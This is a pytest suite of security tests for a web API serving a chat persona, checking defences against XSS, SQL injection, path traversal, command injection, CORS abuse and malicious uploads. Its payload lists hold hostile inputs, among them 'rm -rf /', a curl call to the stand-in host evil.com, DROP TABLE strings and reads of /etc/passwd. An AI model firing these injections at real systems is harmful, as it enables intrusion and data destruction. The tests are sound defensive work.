# -*- coding: utf-8 -*-
"""
Security Validation Tests
Comprehensive security testing for production readiness
"""

import pytest
import json
import time
import base64

class TestInputValidationSecurity:
    """Test input validation and sanitization"""

    @pytest.mark.security
    def test_xss_prevention(self, client, security_validator):
        """Test XSS attack prevention"""

        xss_payloads = [
            '<script>alert("xss")</script>',
            '<img src=x onerror=alert(1)>',
            'javascript:alert(1)',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<object data="data:text/html,<script>alert(1)</script>">',
            '<embed src="data:text/html,<script>alert(1)</script>">'
        ]

        endpoints = [
            ('/api/v1/chat', 'message', {'persona': 'dr_gasnelio'}),
            ('/api/v1/feedback', 'feedback_text', {'rating': 5, 'persona': 'dr_gasnelio'})
        ]

        for endpoint, field, base_data in endpoints:
            for payload in xss_payloads:
                data = base_data.copy()
                data[field] = payload

                response = client.post(endpoint,
                                      json=data,
                                      content_type='application/json')

                # Should not return malicious payload unchanged
                if response.status_code == 200:
                    response_data = response.get_json()
                    response_str = json.dumps(response_data)

                    # XSS payload should be sanitized or escaped
                    assert payload not in response_str, \
                        f"XSS payload returned unchanged in {endpoint}: {payload}"

                    # Check for common XSS indicators
                    dangerous_patterns = ['<script', 'javascript:', 'onerror=', 'onload=']
                    for pattern in dangerous_patterns:
                        assert pattern.lower() not in response_str.lower(), \
                            f"Dangerous XSS pattern found in response: {pattern}"

                # Security headers should be present
                security_validator.check_security_headers(response)

    @pytest.mark.security
    def test_sql_injection_prevention(self, client):
        """Test SQL injection attack prevention"""

        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; DELETE FROM feedback; --",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES ('hacker'); --",
            "' OR 1=1 --",
            "'; EXEC xp_cmdshell('dir'); --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --"
        ]

        # Test endpoints that might interact with database
        endpoints = [
            ('/api/v1/feedback', 'feedback_text', {
                'rating': 5,
                'persona': 'dr_gasnelio'
            }),
            ('/api/v1/chat', 'message', {
                'persona': 'dr_gasnelio'
            })
        ]

        for endpoint, field, base_data in endpoints:
            for payload in sql_payloads:
                data = base_data.copy()
                data[field] = payload

                response = client.post(endpoint,
                                      json=data,
                                      content_type='application/json')

                # Should handle SQL injection attempts gracefully
                # Either sanitized (200) or rejected (400/422)
                assert response.status_code in [200, 400, 422], \
                    f"Unexpected status {response.status_code} for SQL injection test"

                if response.status_code == 200:
                    response_data = response.get_json()
                    # Should not contain SQL keywords indicating successful injection
                    response_str = json.dumps(response_data).lower()
                    dangerous_keywords = ['drop table', 'delete from', 'insert into', 'union select']
                    for keyword in dangerous_keywords:
                        assert keyword not in response_str, \
                            f"SQL injection may have succeeded, found: {keyword}"

    @pytest.mark.security
    def test_path_traversal_prevention(self, client):
        """Test path traversal attack prevention"""

        path_traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '/etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            'file:///etc/passwd',
            '..%252f..%252f..%252fetc%252fpasswd'
        ]

        # Test endpoints that might handle file operations
        for payload in path_traversal_payloads:
            # Test in various request contexts
            response = client.get(f'/api/v1/docs/{payload}')

            # Should not return sensitive system files
            if response.status_code == 200:
                response_text = response.get_data(as_text=True).lower()

                # Check for signs of successful path traversal
                sensitive_patterns = [
                    'root:x:', 'bin:x:', 'daemon:x:',  # /etc/passwd indicators
                    '[boot loader]', '[operating systems]',  # Windows boot.ini
                    'sam account manager'  # Windows SAM file
                ]

                for pattern in sensitive_patterns:
                    assert pattern not in response_text, \
                        f"Path traversal may have succeeded, found: {pattern}"

    @pytest.mark.security
    def test_command_injection_prevention(self, client):
        """Test command injection prevention"""

        command_injection_payloads = [
            '; ls -la',
            '| cat /etc/passwd',
            '&& rm -rf /',
            '`whoami`',
            '$(id)',
            '; ping google.com',
            '|| curl evil.com',
            '& net user hacker password /add'
        ]

        # Test endpoints that might process input
        endpoints = [
            ('/api/v1/chat', 'message', {'persona': 'dr_gasnelio'}),
            ('/api/v1/feedback', 'feedback_text', {'rating': 5, 'persona': 'dr_gasnelio'})
        ]

        for endpoint, field, base_data in endpoints:
            for payload in command_injection_payloads:
                data = base_data.copy()
                data[field] = payload

                response = client.post(endpoint,
                                      json=data,
                                      content_type='application/json')

                # Should handle command injection attempts safely
                if response.status_code == 200:
                    response_data = response.get_json()
                    response_str = json.dumps(response_data)

                    # Should not contain command execution results
                    command_indicators = [
                        'uid=', 'gid=',  # id command output
                        'total ', 'drwx',  # ls command output
                        'pong', 'ping statistics',  # ping command output
                        'the command completed successfully'  # Windows command success
                    ]

                    for indicator in command_indicators:
                        assert indicator.lower() not in response_str.lower(), \
                            f"Command injection may have succeeded, found: {indicator}"

class TestAuthenticationSecurity:
    """Test authentication and authorization security"""

    @pytest.mark.security
    def test_jwt_token_validation(self, client):
        """Test JWT token validation"""

        # Test with invalid JWT tokens
        invalid_tokens = [
            'invalid.token.here',
            'Bearer invalid_token',
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature',
            '',
            'null',
            'undefined'
        ]

        for token in invalid_tokens:
            headers = {'Authorization': f'Bearer {token}'}

            # Test protected endpoints (if any)
            response = client.get('/api/v1/admin/stats', headers=headers)

            # Should reject invalid tokens
            if response.status_code != 404:  # If endpoint exists
                assert response.status_code in [401, 403], \
                    f"Invalid token should be rejected, got {response.status_code}"

    @pytest.mark.security
    def test_session_security(self, client):
        """Test session management security"""

        # Test session fixation prevention
        response1 = client.get('/api/v1/health')
        session1_cookies = response1.headers.get('Set-Cookie', '')

        response2 = client.get('/api/v1/health')
        session2_cookies = response2.headers.get('Set-Cookie', '')

        # Sessions should have secure attributes if implemented
        if session1_cookies or session2_cookies:
            for cookie_header in [session1_cookies, session2_cookies]:
                if cookie_header:
                    # Check for secure cookie attributes
                    assert 'HttpOnly' in cookie_header or 'httponly' in cookie_header.lower(), \
                        "Session cookies should be HttpOnly"

                    if 'Secure' in cookie_header or 'secure' in cookie_header.lower():
                        # If Secure flag is set, it should be used correctly
                        pass  # This is good

    @pytest.mark.security
    def test_password_handling(self, client):
        """Test password handling security (if applicable)"""

        # Test password in requests are not logged/returned
        password_data = {
            'username': 'testuser',
            'password': 'secret123',
            'email': 'test@example.com'
        }

        response = client.post('/api/v1/auth/register',
                              json=password_data,
                              content_type='application/json')

        if response.status_code != 404:  # If endpoint exists
            # Should not return password in response
            if response.status_code in [200, 201]:
                response_data = response.get_json()
                response_str = json.dumps(response_data)

                assert 'secret123' not in response_str, \
                    "Password should not be returned in response"

class TestRateLimitingSecurity:
    """Test rate limiting security measures"""

    @pytest.mark.security
    def test_rate_limiting_enforcement(self, client):
        """Test rate limiting prevents abuse"""

        # Make rapid requests to trigger rate limiting
        responses = []
        start_time = time.time()

        for i in range(50):  # Reduced from RATE_LIMIT_TEST_REQUESTS for faster testing
            response = client.post('/api/v1/chat',
                                  json={
                                      'message': f'Test message {i}',
                                      'persona': 'dr_gasnelio'
                                  },
                                  content_type='application/json')
            responses.append(response.status_code)

            # Small delay to prevent overwhelming test environment
            time.sleep(0.01)

        end_time = time.time()
        duration = end_time - start_time

        # Analyze rate limiting behavior
        status_counts = {}
        for status in responses:
            status_counts[status] = status_counts.get(status, 0) + 1

        # If rate limiting is active, should see 429 responses
        if 429 in status_counts:
            rate_limited_count = status_counts[429]
            assert rate_limited_count > 0, "Rate limiting should block some requests"

            # Rate limiting should kick in reasonably quickly
            first_429_index = responses.index(429)
            assert first_429_index < 30, "Rate limiting should activate within first 30 requests"

        # Should have some successful responses initially
        success_count = status_counts.get(200, 0)
        assert success_count > 0, "Should allow some requests before rate limiting"

    @pytest.mark.security
    def test_rate_limiting_different_ips(self, client):
        """Test rate limiting is applied per IP"""

        # Simulate requests from different IPs using X-Forwarded-For header
        ip_addresses = ['192.168.1.1', '192.168.1.2', '10.0.0.1']

        for ip in ip_addresses:
            headers = {'X-Forwarded-For': ip}

            # Each IP should get its own rate limit allowance
            responses = []
            for i in range(10):
                response = client.post('/api/v1/chat',
                                      json={
                                          'message': f'Test from {ip} - {i}',
                                          'persona': 'dr_gasnelio'
                                      },
                                      headers=headers,
                                      content_type='application/json')
                responses.append(response.status_code)

            # Should allow some requests for each IP
            success_count = sum(1 for status in responses if status == 200)
            assert success_count > 0, f"IP {ip} should be allowed some requests"

class TestDataProtectionSecurity:
    """Test data protection and privacy security"""

    @pytest.mark.security
    def test_sensitive_data_exposure(self, client, security_validator):
        """Test that sensitive data is not exposed"""

        # Test various endpoints for sensitive data exposure
        endpoints = [
            '/api/v1/health',
            '/api/v1/personas',
            '/api/v1/monitoring/stats',
            '/',
            '/api/v1/docs'
        ]

        for endpoint in endpoints:
            response = client.get(endpoint)

            if response.status_code == 200:
                response_data = response.get_json() or {}
                security_validator.check_no_sensitive_data(response_data)

    @pytest.mark.security
    def test_error_information_disclosure(self, client):
        """Test that errors don't expose sensitive information"""

        # Trigger various error conditions
        error_tests = [
            ('GET', '/nonexistent/endpoint', None),
            ('POST', '/api/v1/chat', {'invalid': 'data'}),
            ('PUT', '/api/v1/health', None),  # Wrong method
            ('POST', '/api/v1/feedback', {'malformed': 'json'})
        ]

        for method, endpoint, data in error_tests:
            if method == 'GET':
                response = client.get(endpoint)
            elif method == 'POST':
                response = client.post(endpoint, json=data, content_type='application/json')
            elif method == 'PUT':
                response = client.put(endpoint)

            # Error responses should not expose sensitive information
            if response.status_code >= 400:
                response_text = response.get_data(as_text=True)

                # Should not contain stack traces, file paths, or internal details
                sensitive_patterns = [
                    'Traceback',
                    '/home/', '/usr/', '/var/',  # Unix paths
                    'C:\\', 'D:\\',  # Windows paths
                    'SECRET_KEY', 'API_KEY',
                    'password', 'token',
                    'sqlite3.', 'psycopg2.',  # Database errors
                    'File "/', 'line '  # Python stack trace indicators
                ]

                for pattern in sensitive_patterns:
                    assert pattern not in response_text, \
                        f"Error response contains sensitive information: {pattern}"

    @pytest.mark.security
    def test_logging_security(self, client):
        """Test that logs don't contain sensitive information"""

        # Make requests that might be logged
        test_data = {
            'message': 'Test message with password: secret123',
            'persona': 'dr_gasnelio',
            'api_key': 'sk-test123456789',
            'email': 'user@example.com'
        }

        response = client.post('/api/v1/chat',
                              json=test_data,
                              content_type='application/json')

        # Note: This test assumes we have access to logs
        # In a real implementation, you'd check actual log files
        # For now, we just ensure the request completes without error
        assert response.status_code in [200, 400, 422, 500]

class TestHeadersSecurity:
    """Test security headers and configurations"""

    @pytest.mark.security
    def test_security_headers_comprehensive(self, client, security_validator):
        """Test comprehensive security headers"""

        response = client.get('/api/v1/health')

        # Test all security headers
        security_validator.check_security_headers(response)

        # Test specific header values
        headers = response.headers

        # X-Content-Type-Options
        assert headers.get('X-Content-Type-Options') == 'nosniff'

        # X-Frame-Options
        assert headers.get('X-Frame-Options') in ['DENY', 'SAMEORIGIN']

        # X-XSS-Protection
        xss_protection = headers.get('X-XSS-Protection', '')
        assert '1' in xss_protection  # Should be enabled

        # Content-Security-Policy
        csp = headers.get('Content-Security-Policy', '')
        assert "default-src 'self'" in csp  # Should have restrictive CSP

        # Referrer-Policy
        assert 'Referrer-Policy' in headers

    @pytest.mark.security
    def test_cors_security(self, client):
        """Test CORS security configuration"""

        # Test CORS with various origins
        test_origins = [
            'https://evil.com',
            'http://malicious.site',
            'null',
            'file://',
            'data:text/html,<script>alert(1)</script>'
        ]

        for origin in test_origins:
            headers = {'Origin': origin}
            response = client.get('/api/v1/health', headers=headers)

            cors_origin = response.headers.get('Access-Control-Allow-Origin', '')

            # Should not allow arbitrary origins
            if cors_origin != '*':  # If not wildcard
                assert origin not in cors_origin, \
                    f"CORS should not allow origin: {origin}"

    @pytest.mark.security
    def test_content_type_security(self, client):
        """Test content type security"""

        # Test with various content types
        malicious_content_types = [
            'text/html',
            'application/xml',
            'text/xml',
            'multipart/form-data',
            'application/x-www-form-urlencoded'
        ]

        for content_type in malicious_content_types:
            response = client.post('/api/v1/chat',
                                  data='{"message":"test","persona":"dr_gasnelio"}',
                                  content_type=content_type)

            # Should validate content type
            if response.status_code not in [200, 415]:
                # 415 Unsupported Media Type is acceptable
                assert response.status_code in [400, 422], \
                    f"Unexpected response for content-type {content_type}: {response.status_code}"

class TestFileUploadSecurity:
    """Test file upload security (if applicable)"""

    @pytest.mark.security
    def test_malicious_file_upload(self, client, sample_image_data):
        """Test protection against malicious file uploads"""

        # Test malicious file types
        malicious_files = [
            ('malicious.exe', 'application/octet-stream'),
            ('virus.bat', 'application/x-msdos-program'),
            ('script.php', 'application/x-php'),
            ('shell.jsp', 'application/x-jsp'),
            ('payload.html', 'text/html')
        ]

        for filename, content_type in malicious_files:
            # Create fake malicious file data
            malicious_data = base64.b64encode(b'malicious content').decode('utf-8')

            upload_data = {
                'image': malicious_data,
                'filename': filename,
                'content_type': content_type
            }

            response = client.post('/api/v1/multimodal/analyze',
                                  json=upload_data,
                                  content_type='application/json')

            if response.status_code != 404:  # If endpoint exists
                # Should reject malicious file types
                assert response.status_code in [400, 415, 422], \
                    f"Should reject malicious file {filename}"

    @pytest.mark.security
    def test_file_size_limits(self, client):
        """Test file size limit enforcement"""

        # Create oversized file data (simulate 20MB file)
        oversized_data = base64.b64encode(b'x' * (20 * 1024 * 1024)).decode('utf-8')

        upload_data = {
            'image': oversized_data,
            'format': 'png'
        }

        response = client.post('/api/v1/multimodal/analyze',
                              json=upload_data,
                              content_type='application/json')

        if response.status_code != 404:  # If endpoint exists
            # Should reject oversized files
            assert response.status_code in [400, 413, 422], \
                "Should reject oversized files"

class TestCryptographicSecurity:
    """Test cryptographic security measures"""

    @pytest.mark.security
    def test_secure_random_generation(self, client):
        """Test secure random number generation"""

        # Test endpoints that might generate tokens or IDs
        responses = []
        for _ in range(5):
            response = client.post('/api/v1/chat',
                                  json={
                                      'message': 'Generate session ID',
                                      'persona': 'dr_gasnelio'
                                  },
                                  content_type='application/json')
            responses.append(response)

        # If session IDs or similar are generated, they should be unique
        session_ids = set()
        for response in responses:
            if response.status_code == 200:
                data = response.get_json()
                if 'session_id' in data:
                    session_ids.add(data['session_id'])

        # All session IDs should be unique
        if session_ids:
            assert len(session_ids) == len([r for r in responses if r.status_code == 200]), \
                "Session IDs should be unique"

    @pytest.mark.security
    def test_timing_attack_prevention(self, client):
        """Test timing attack prevention"""

        # Test authentication timing with valid vs invalid users
        # This would be more relevant if there's user authentication

        valid_user_times = []
        invalid_user_times = []

        for _ in range(10):
            # Test valid user pattern
            start_time = time.time()
            response = client.post('/api/v1/auth/login',
                                  json={'username': 'validuser', 'password': 'password'},
                                  content_type='application/json')
            end_time = time.time()

            if response.status_code != 404:  # If endpoint exists
                valid_user_times.append(end_time - start_time)

            # Test invalid user pattern
            start_time = time.time()
            response = client.post('/api/v1/auth/login',
                                  json={'username': 'invaliduser', 'password': 'password'},
                                  content_type='application/json')
            end_time = time.time()

            if response.status_code != 404:  # If endpoint exists
                invalid_user_times.append(end_time - start_time)

        # Timing should be similar to prevent user enumeration
        if valid_user_times and invalid_user_times:
            avg_valid = sum(valid_user_times) / len(valid_user_times)
            avg_invalid = sum(invalid_user_times) / len(invalid_user_times)

            timing_difference = abs(avg_valid - avg_invalid)
            assert timing_difference < 0.1, \
                f"Timing difference {timing_difference:.3f}s may enable user enumeration"